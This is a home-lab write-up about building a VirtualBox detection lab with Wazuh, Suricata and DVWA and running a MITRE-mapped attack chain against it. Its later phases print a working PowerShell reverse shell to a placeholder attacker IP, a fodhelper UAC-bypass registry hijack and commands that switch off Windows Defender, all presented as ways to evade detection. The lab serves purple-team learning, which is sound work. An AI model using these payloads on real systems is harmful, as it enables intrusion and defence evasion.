# Home Lab 1: Cybersecurity Detection & Attack Lab

**Objective:** Build a multi-VM cybersecurity lab environment with SIEM monitoring (Wazuh), network intrusion detection (Suricata), vulnerable web applications (DVWA), and red team attack simulation — all on a local network.

**Platform:** VirtualBox on Windows  
**Threat Model:** FIN7-inspired attack chain (MITRE ATT&CK mapped)

---

## Table of Contents

1. [Lab Architecture](#lab-architecture)
2. [Phase 1 — VM Setup & Network Configuration](#phase-1--vm-setup--network-configuration)
3. [Phase 2 — Wazuh SIEM Deployment](#phase-2--wazuh-siem-deployment)
4. [Phase 3 — Suricata IDS Integration](#phase-3--suricata-ids-integration)
5. [Phase 4 — DVWA Deployment & Web App Exploitation](#phase-4--dvwa-deployment--web-app-exploitation)
6. [Phase 5 — Privilege Escalation & Post-Exploitation](#phase-5--privilege-escalation--post-exploitation)
7. [Troubleshooting Log](#troubleshooting-log)
8. [Tools Used](#tools-used)

---

## Lab Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        VirtualBox Host (Windows)                │
│                                                                 │
│  ┌──────────────┐    NAT Network     ┌──────────────────────┐   │
│  │   Attacker   │◄──────────────────►│   Ubuntu Server      │   │
│  │   Machine    │                    │  (Pivot Point)       │   │
│  └──────────────┘                    │  - 2 NICs            │   │
│                                      │  - NATNetwork (ext)  │   │
│                                      │  - intnet (int)      │   │
│                                      └──────┬───────────────┘   │
│                                             │ Internal Network  │
│                              ┌──────────────┼──────────────┐    │
│                              │              │              │    │
│                     ┌────────▼───┐  ┌───────▼────┐  ┌──────▼─┐ │
│                     │  Wazuh     │  │  Windows   │  │Windows │ │
│                     │  SIEM      │  │  Victim    │  │Defender│ │
│                     │  Manager   │  │  (DVWA)    │  │        │ │
│                     └────────────┘  └────────────┘  └────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

**Network Segments:**
- **NATNetwork** — Simulates the external/internet-facing segment. Attacker machine and the Ubuntu server's external NIC connect here.
- **intnet (Internal Network)** — Simulates the protected internal network. Wazuh SIEM, Windows victim, Windows defender, and the Ubuntu server's internal NIC connect here.
- The Ubuntu server bridges both segments, acting as a realistic pivot point.

---

## Phase 1 — VM Setup & Network Configuration

### VirtualBox Network Configuration

The lab uses two VirtualBox network types to create realistic segmentation:

**NAT Network (`NATNetwork`):**
- Provides internet access for downloading packages
- Simulates the external-facing network
- Attached to: Attacker VM, Ubuntu Server (Adapter 1)

**Internal Network (`intnet`):**
- Fully isolated segment — no internet access by design
- Simulates a corporate internal network
- Attached to: Ubuntu Server (Adapter 2), Wazuh SIEM, Windows Victim, Windows Defender

### Ubuntu Server — Dual-NIC Pivot Configuration

The Ubuntu server is the backbone of the lab, bridging external and internal segments with IP forwarding enabled.

**Netplan configuration** (`/etc/netplan/01-netcfg.yaml`):

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true          # NAT Network — gets internet access
    enp0s8:
      addresses:
        - 192.168.56.10/24  # Internal Network — static IP
```

Apply with:

```bash
sudo netplan apply
```

**Enable IP forwarding** to allow the server to route between segments:

```bash
# Temporary
sudo sysctl -w net.ipv4.ip_forward=1

# Persistent — uncomment in /etc/sysctl.conf:
net.ipv4.ip_forward=1
```

### Promiscuous Mode Fix

VirtualBox defaults the promiscuous mode setting to **"Deny"** on network adapters, which caused the Ubuntu server to hang during boot when attached to the NAT Network.

**Fix:** In VirtualBox VM Settings → Network → Advanced → set Promiscuous Mode to **"Allow All"** on all adapters used in the lab. This also enables packet capture and traffic analysis between VMs.

### Host-Only Network for Wazuh Dashboard Access

Initially, the SIEM VM was configured on the Internal Network with no route to the host machine, making the Wazuh dashboard inaccessible from the host browser. The solution was adding a **Host-Only Network** adapter:

1. **VirtualBox → File → Host Network Manager** — create a Host-Only network with DHCP enabled
2. Add a second adapter to the Wazuh SIEM VM using the Host-Only network
3. The SIEM then gets an IP on the host-only range (e.g., `192.168.56.x`), accessible from the host browser

### DHCP Troubleshooting on Ubuntu (systemd-networkd)

Newer Ubuntu server installs use `systemd-networkd` instead of `dhclient`. The traditional `sudo dhclient enp0s8` command may not work.

**Solutions that worked:**

```bash
# Method 1 — networkctl
sudo networkctl reconfigure enp0s8

# Method 2 — restart systemd-networkd
sudo systemctl restart systemd-networkd

# Method 3 — netplan (most reliable)
sudo netplan apply
```

---

## Phase 2 — Wazuh SIEM Deployment

### Installation

Wazuh was installed on a dedicated Ubuntu VM on the internal network. The initial download encountered a **403 Forbidden** error when fetching packages.

**Root cause:** User-agent filtering or IP reputation blocking on the download server.

**Fix:** Use a standard browser user-agent string with `curl`:

```bash
curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
  -o wazuh-install.sh https://packages.wazuh.com/4.x/wazuh-install.sh
```

### Agent Enrollment

Wazuh agents were deployed on the Ubuntu server and Windows victim machine. Key takeaway: there is no separate "Suricata agent" — the **Wazuh agent** runs on the host and reads local log files (including Suricata's).

The agent registers under the VM's hostname in the Wazuh dashboard.

---

## Phase 3 — Suricata IDS Integration

### Suricata Configuration

Suricata was installed on the Ubuntu server to monitor network traffic passing through the pivot point.

**Key settings in `/etc/suricata/suricata.yaml`:**

```yaml
vars:
  address-groups:
    HOME_NET: "[192.168.56.0/24]"    # Internal network range

af-packet:
  - interface: enp0s8               # Monitor the internal-facing interface

community-id: true                   # Enable correlation with Wazuh
```

### Wazuh + Suricata Integration

The Wazuh agent on the Ubuntu server was configured to ingest Suricata's `eve.json` log:

**Added to `/var/ossec/etc/ossec.conf`:**

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

### Permission Fix

Wazuh couldn't read the Suricata log due to file permissions.

```bash
sudo chmod 644 /var/log/suricata/eve.json
```

### JSON Decoder Error

After integration, Wazuh threw a **"Too many fields for JSON decoder"** error because Suricata's `eve.json` output can contain deeply nested JSON.

**Fix — on the Wazuh Manager**, increase the decoder limit in `/var/ossec/etc/internal_options.conf`:

```
analysisd.decoder_order_size=2048
```

Then restart the Wazuh manager:

```bash
sudo systemctl restart wazuh-manager
```

### Viewing Suricata Alerts in Wazuh

Navigate to **Threat Hunting** module in the Wazuh dashboard and filter with:

```
rule.groups:suricata
```

This surfaces all IDS alerts correlated with Wazuh's analysis engine.

---

## Phase 4 — DVWA Deployment & Web App Exploitation

### DVWA Setup

DVWA (Damn Vulnerable Web Application) was installed on the Windows victim machine using **XAMPP** as the web server stack. The internal machines access it via the Windows VM's internal IP.

### Command Injection → Reverse Shell

DVWA's command injection vulnerability was exploited to gain a foothold on the Windows host.

**Attack chain:**
1. Identify command injection in DVWA's "Command Injection" module
2. Inject a PowerShell reverse shell payload through the web form
3. Catch the reverse shell on the attacker machine with `netcat`

**PowerShell reverse shell (avoids dropping executables on disk):**

```powershell
powershell -nop -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('<ATTACKER_IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```

Using a PowerShell-based shell avoided triggering Windows Defender, which would have flagged dropped executables like `nc.exe` or Meterpreter payloads.

---

## Phase 5 — Privilege Escalation & Post-Exploitation

### UAC Bypass via fodhelper.exe

After landing a shell through DVWA, the user account was already in the **Administrators** group but restricted by UAC (User Account Control).

**Bypass technique using `fodhelper.exe`:**

```powershell
# Set registry key to hijack fodhelper's auto-elevate behavior
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -nop -ep bypass -c <REVERSE_SHELL_PAYLOAD>" -Force

# Trigger the auto-elevated process
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

This launches a new elevated shell without triggering a UAC prompt.

### Disabling Windows Defender

Once elevated, Defender was disabled to allow further tool usage:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\<username>\Desktop"
```

---

## Troubleshooting Log

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| Ubuntu server hangs on boot | Promiscuous mode set to "Deny" on NAT Network adapter | Set to "Allow All" in VirtualBox adapter settings |
| Wazuh package download returns 403 | User-agent filtering on download server | Use Mozilla user-agent string with `curl -A` |
| Can't access Wazuh dashboard from host | SIEM VM only on Internal Network (no route to host) | Add Host-Only Network adapter to SIEM VM |
| `dhclient` command not found on Ubuntu | Newer Ubuntu uses `systemd-networkd` instead | Use `netplan apply` or `networkctl reconfigure` |
| Wazuh can't read Suricata logs | File permissions on `eve.json` | `chmod 644 /var/log/suricata/eve.json` |
| "Too many fields for JSON decoder" in Wazuh | Default decoder field limit too low for Suricata JSON | Increase `decoder_order_size` to 2048 in `internal_options.conf` |
| Ubuntu VM loses connectivity to Wazuh manager | Network regression — DHCP lease or NetworkManager state | Restart NetworkManager, renew DHCP, verify routing |
| Windows Defender blocks reverse shell tools | AV detects dropped executables | Use PowerShell-native reverse shells (fileless) |
| DVWA not accessible from internal VMs | Network segmentation routing issue | Verify IP forwarding on Ubuntu server, check `intnet` adapter |

---

## Tools Used

`VirtualBox` · `Wazuh` · `Suricata` · `DVWA` · `XAMPP` · `netcat` · `PowerShell` · `nmap` · `Wireshark` · `netplan` · `systemd-networkd` · `curl`

---

## MITRE ATT&CK Mapping

| Technique | ID | Lab Activity |
|-----------|----|-------------|
| Exploit Public-Facing Application | T1190 | DVWA command injection |
| Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell reverse shell |
| Abuse Elevation Control Mechanism: Bypass UAC | T1548.002 | fodhelper.exe UAC bypass |
| Impair Defenses: Disable or Modify Tools | T1562.001 | Disabling Windows Defender |
| Network Service Discovery | T1046 | Internal network scanning |
| Proxy: Internal Proxy | T1090.001 | Ubuntu server as pivot between segments |

---

## Key Takeaways

- **Network architecture matters.** VirtualBox networking (NAT vs Internal vs Host-Only) directly impacts what's reachable and what's isolated. Understanding these modes is essential before deploying any lab services.
- **The Wazuh agent is the universal collector.** There's no need for tool-specific agents — Wazuh reads local logs from Suricata, syslog, and application logs through its `ossec.conf` configuration.
- **Fileless attacks bypass endpoint detection.** PowerShell-native payloads avoided Defender detection where dropped executables would have been immediately flagged.
- **Purple team value is immediate.** Running attacks while monitoring Wazuh and Suricata in real time shows exactly which TTPs generate alerts and which slip through — revealing detection gaps that need custom rules.
